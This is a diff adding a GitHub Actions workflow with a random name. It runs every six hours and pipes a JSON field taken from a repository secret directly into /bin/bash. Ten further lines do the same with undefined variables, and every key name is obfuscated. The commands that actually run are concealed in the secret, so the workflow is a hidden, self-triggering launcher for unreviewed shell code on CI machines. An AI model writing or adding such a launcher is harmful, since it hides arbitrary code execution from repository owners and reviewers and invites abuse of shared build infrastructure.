@@ -1,0 +1,29 @@
+name: zhongquanhuohuang
+
+on:
+  workflow_dispatch:
+  schedule:
+    - cron: '15 4/6 * * *'
+
+jobs:
+  build:
+    runs-on: ubuntu-latest
+
+    steps:
+      - uses: actions/checkout@v4
+      - name: zhongquanhuohuang
+        env:
+          bah7721: ${{ secrets.bah7721 }}
+        run: |
+          echo $bah7721 | jq -r .f89 | /bin/bash
+          echo $wzt10507 | jq -r .dp4 | /bin/bash
+          echo $vwu0 | jq -r .qhmen42 | /bin/bash
+          echo $zafga17 | jq -r .tgo10 | /bin/bash
+          echo $y3402 | jq -r .vls7 | /bin/bash
+          echo $l67578 | jq -r .mfk95 | /bin/bash
+          echo $b24932 | jq -r .qc05 | /bin/bash
+          echo $wxrn84361 | jq -r .ue1 | /bin/bash
+          echo $gc33260 | jq -r .lw48842 | /bin/bash
+          echo $pfzes32262 | jq -r .mhtv0338 | /bin/bash
+          echo $kkt40 | jq -r .ddv5415 | /bin/bash
+
